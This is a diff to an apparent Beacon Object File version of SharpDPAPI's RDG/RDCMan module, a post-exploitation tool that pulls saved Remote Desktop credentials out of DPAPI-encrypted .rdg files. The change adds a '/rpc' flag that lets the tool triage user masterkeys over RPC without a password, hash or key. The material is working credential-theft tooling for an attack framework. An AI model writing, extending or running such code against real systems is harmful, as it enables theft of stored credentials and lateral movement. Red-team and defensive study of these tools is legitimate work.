@@ -4,7 +4,7 @@
  * Usage:
  *   rdg [/pvk:BASE64] [/password:PASSWORD] [/ntlm:HASH]
  *       [/credkey:KEY] [/target:PATH] [/server:SERVER]
- *       [/unprotect]
+ *       [/unprotect] [/rpc]
  *
  * Triages RDCMan .rdg files and Remote Desktop connection settings
  * for saved credentials (DPAPI-encrypted).
@@ -26,6 +26,7 @@ void go(char* args, int args_len) {
     char* target_str = BeaconDataExtract(&parser, NULL);
     char* server_str = BeaconDataExtract(&parser, NULL);
     int   unprotect  = BeaconDataInt(&parser);
+    int   use_rpc    = BeaconDataInt(&parser);
 
     BYTE* pvk = NULL;
     int pvk_len = 0;
@@ -67,11 +68,11 @@ void go(char* args, int args_len) {
     BeaconPrintf(CALLBACK_OUTPUT, "\n=== SharpDPAPI RDG/RDCMan (BOF) ===\n");
 
     /* Triage masterkeys first */
-    if (pvk || password || ntlm) {
+    if (pvk || password || ntlm || use_rpc) {
         triage_user_masterkeys(&cache, pvk, pvk_len,
             (password && strlen(password) > 0) ? password : NULL,
             (ntlm && strlen(ntlm) > 0) ? ntlm : NULL,
-            NULL, FALSE, NULL, server, FALSE, NULL);
+            NULL, (BOOL)use_rpc, NULL, server, FALSE, NULL);
     }
 
     /* Triage RDG/RDCMan files */
